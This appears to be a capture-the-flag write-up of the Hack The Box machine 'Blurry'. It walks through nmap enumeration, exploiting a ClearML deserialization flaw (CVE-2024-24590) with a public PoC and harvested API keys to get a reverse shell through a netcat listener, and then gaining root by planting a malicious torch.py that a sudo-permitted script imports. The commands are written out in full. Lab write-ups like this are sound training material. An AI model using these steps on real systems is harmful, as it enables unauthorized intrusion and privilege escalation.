---
title: HTB - Blurry
date: 2024-10-12 00:00:00 + 1000
categories: [Linux,Web App,CTF,HTB]
tags: [WebExploitation,Deserialization,ClearML,CVE-2024-24590]
comments: false
---

The Blurry HTB machine was compromised by exploiting a deserialisation vulnerability (CVE-2024-24590) in the ClearML API, leading to initial access as the `jippity` user. Privilege escalation was achieved by leveraging a `sudo` allowed command, `/usr/bin/evaluate_model`, to execute a crafted python script, resulting in root access.

## Common Enumerations

### Nmap

I fired up the `nmap -p- -sC -sV -oA recon/allport 10.10.11.19 --open` - which found two open ports (SSH-22, HTTP-80)

- Full port scan `-p-`
- Default Script `-sC`
- Version detection `-sV`
- Save the results to `-oA recon/allport`
- Only show open ports `--open`

```bash
$ sudo nmap -p- -sC -sV -oA recon/allport 10.10.11.19 --open
[sudo] password for ctf: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-09 12:37 AEST
Nmap scan report for 10.10.11.19
Host is up (0.0057s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://app.blurry.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.67 seconds
```

It redirected to `app.blurry.htb`, so I added to my `/etc/hosts` file

### Website - 80

Browsing the `app.blurry.htb` brings up the login page for clearml. An open source platform for machine-learning-workflows; clearml is for streamline CI/CD for AI

![img](/assets/img/Blurry/1.webp)

Quick Google search, led me to "Deserialisation of Untrusted Data" - [CVE-2024-24590](https://security.snyk.io/vuln/SNYK-PYTHON-CLEARML-6230390) vulnerability

## Initial Access

Okay, so on the ClearML web interface, there was a project called "Black Swan" that was active

![img](/assets/img/Blurry/2.webp)

I did some more digging and found a Proof of Concept [PoC](https://github.com/LordVileOnX/ClearML-vulnerability-exploit-RCE-2024-CVE-2024-24590-) on GitHub

### Testing PoC

Inside the "Black Swan" project, I saw options to create a "New Experiment" and "Create New Credentials."

![img](/assets/img/Blurry/3.webp)

The key was the credentials. I grabbed the access and secret keys and added `api.blurry.htb` and `files.blurry.htb` to `/etc/hosts`, so that all relevant domains pointed to the target machine. Here's what my hosts file now looked like:

```bash
10.10.11.19     app.blurry.htb api.blurry.htb files.blurry.htb
```

I now had the credentials to interact with the clearml api. Here's what that looked like:

```python
api {
  web_server: http://app.blurry.htb
  api_server: http://api.blurry.htb
  files_server: http://files.blurry.htb
  credentials {
    "access_key" = "BKF98AG8EEVIF5A2YXFD"
    "secret_key" = "BJ5qvWSvOz7mp2Of3EIBq4ioh1bHViDavaI9TRQcENjrcgJKq5"
  }
}
```

Next, I installed the `clearml` python package using `pip install clearml`. This is the library that the PoC and the CLI tool use to interact with the ClearML API. I then ran `clearml-init` to configure the API with the extracted credentials

```bash
$ clearml-init
ClearML SDK setup process

Please create new clearml credentials through the settings page in your `clearml-server` web app (e.g. http://localhost:8080//settings/workspace-configuration) 
Or create a free account at https://app.clear.ml/settings/workspace-configuration

In settings page, press "Create new credentials", then press "Copy to clipboard".

Paste copied configuration here:
api {
  web_server: http://app.blurry.htb
  api_server: http://api.blurry.htb
  files_server: http://files.blurry.htb
  credentials {
    "access_key" = "BKF98AG8EEVIF5A2YXFD"
    "secret_key" = "BJ5qvWSvOz7mp2Of3EIBq4ioh1bHViDavaI9TRQcENjrcgJKq5"
  }
}
```

With the API credentials configured, I set up a netcat listener with the command `nc -lvnp 1337` on my attacking machine and ran the exploit from GitHub using `python3 exploit.py`

```bash
$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.33] from (UNKNOWN) [10.10.11.19] 35952
bash: cannot set terminal process group (2083): Inappropriate ioctl for device
bash: no job control in this shell
jippity@blurry:~$ whoami
whoami
jippity
jippity@blurry:~$ 
```

And boom! I got a shell as the user `jippity`

### Shell as jippity

I upgraded my shell to a more interactive one using Python

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

Next up, I have grab that user flag

```text
328b36e9....
```

## Privilege escalation

Time to get root! I checked for any easy privilege escalation possibilities using `sudo -l`. This command lists the commands that the current user can run with `sudo` without a password. Jackpot! It turns out that `jippity` can run `/usr/bin/evaluate_model` with `sudo` privileges without a password

```bash
jippity@blurry:~$ sudo -l
Matching Defaults entries for jippity on blurry:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jippity may run the following commands on blurry:
    (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth
jippity@blurry:~$ 
```

I created a file in the `/models` directory called `torch.py` and filled it with python code to execute a bash shell. This is where the RCE comes in. Here's the command:

```bash
echo 'import os; os.system("bash")' > /models/torch.py
```

Then, I ran the sudo command with my malicious file like this: `sudo /usr/bin/evaluate_model /models/demo_model.pth`

```bash
jippity@blurry:~$ sudo /usr/bin/evaluate_model /models/demo_model.pth 
```

And there it was! Root access! I grabbed the root flag

```bash
jippity@blurry:/models$ sudo /usr/bin/evaluate_model /models/demo_model.pth 
[+] Model /models/demo_model.pth is considered safe. Processing...
root@blurry:/models# whoami
root
root@blurry:/models# 
root@blurry:/models# cat /root/root.txt
de5a6a7b9248be166602677182155eb4
root@blurry:/models# 
```

root.txt

```text
de5a6a7b92....
```
